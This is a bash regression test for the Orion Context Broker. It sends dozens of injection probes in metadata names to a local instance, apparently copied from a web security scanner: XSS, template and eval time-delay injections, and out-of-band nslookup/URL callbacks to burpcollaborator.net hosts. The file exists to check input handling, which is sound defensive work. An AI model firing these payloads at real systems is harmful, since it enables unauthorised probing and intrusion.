#!/bin/bash
# Copyright 2019 Telefonica Investigacion y Desarrollo, S.A.U
#
# This file is part of Orion Context Broker.
#
# Orion Context Broker is free software: you can redistribute it and/or
# modify it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
# Orion Context Broker is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Affero
# General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with Orion Context Broker. If not, see http://www.gnu.org/licenses/.
#
# For those usages not covered by this license please contact with
# iot_support at tid dot es


echo "* Request 1"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456\u0000alert(1)",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 2"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456confirm%281%29",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 3"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456\u0000confirm(1)",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 4"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456prompt(1)",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 5"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456prompt%281%29",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 6"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456\u0000prompt(1)",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 7"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456document.location=1",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 8"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456document%2elocation%3d1",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 9"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456\u0000document.location=1",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 10"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456document.title=1",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 11"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456document%2etitle%3d1",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 12"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456\u0000document.title=1",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 13"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456xcafu<a>itbln",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 14"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456xcafu%3ca%3eitbln",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 15"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456\u0000xcafu<a>itbln",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 16"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456fihcxcjnfj><",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 17"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456fihcxcjnfj%3e%3c",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 18"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456\u0000fihcxcjnfj><",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 19"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "alert(1)",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 20"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "alert%281%29",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 21"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "\u0000alert(1)",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 22"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "confirm(1)",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 23"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "confirm%281%29",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 24"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "\u0000confirm(1)",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 25"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "prompt(1)",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 26"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "prompt%281%29",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 27"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "\u0000prompt(1)",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 28"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "document.location=1",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 29"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "document%2elocation%3d1",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 30"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "\u0000document.location=1",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 31"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "document.title=1",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 32"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "document%2etitle%3d1",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 33"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "\u0000document.title=1",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 34"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "j1qd6<a>hbh9w",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 35"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "j1qd6%3ca%3ehbh9w",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 36"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "\u0000j1qd6<a>hbh9w",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 37"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "rkie9rjbs9><",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 38"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "rkie9rjbs9%3e%3c",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 39"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "\u0000rkie9rjbs9><",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 40"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "kq32q\${699*446}ff1d6",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 41"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "iiw98{{338*263}}a3icf",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 42"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456}}frq9y'\/\"<jxvbw",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 43"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456%}b6oz2'\/\"<zlakj",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 44"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456lg097%>opu7k'\/\"<qzpa2",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 45"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456'+sleep(20.to_i)+'",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 46"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456'+eval(compile('for x in range(1):\\n import time\\n time.sleep(20)','a','single'))+'",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 47"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "eval(compile('for x in range(1):\\n import time\\n time.sleep(20)','a','single'))",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 48"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456'.sleep(20).'",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 49"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456{\${sleep(20)}}",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 50"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "4xcg6zbawf\u00c1\u0081n3f7qcdsre",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 51"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "4xcg6zbawf\u00c1\u0081n3f7qcdsre",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 52"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "4uf581xc0d%41eurs8u4oo8",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 53"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "4uf581xc0d%41eurs8u4oo8",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 54"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "3o39zg2ds5\\\\lyg2u72oqu",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 55"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "3o39zg2ds5\\\\lyg2u72oqu",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 56"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "kc3yxo9v5u&#65;stylq44j9m",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 57"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "kc3yxo9v5u&#65;stylq44j9m",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 58"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456nb2jps7e1x\u00c1\u0081z4olskyf6i",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 59"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456nb2jps7e1x\u00c1\u0081z4olskyf6i",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 60"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456d6j23qbyqq%41e0lf8d976m",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 61"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456d6j23qbyqq%41e0lf8d976m",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 62"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456d80yc3ruik\\\\l8t6pa77jt",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 63"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456d80yc3ruik\\\\l8t6pa77jt",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 64"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456klpgvnfqx8&#65;np9jjwl4k0",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 65"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456klpgvnfqx8&#65;np9jjwl4k0",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 66"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "dar1g6wh0eyh690lkpm1v1vgm7syim8a0yslk99.burpcollaborator.net",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 67"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "http:\/\/zlonrs73b093hvb7vbxn6n62xt3kt8jw9k17tvi.burpcollaborator.net\/?test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 68"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "nslookup -q=cname gsc4y9ekihgkocio2s44d4dj4aa10pqdjg78u0ip.burpcollaborator.net.&",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 69"
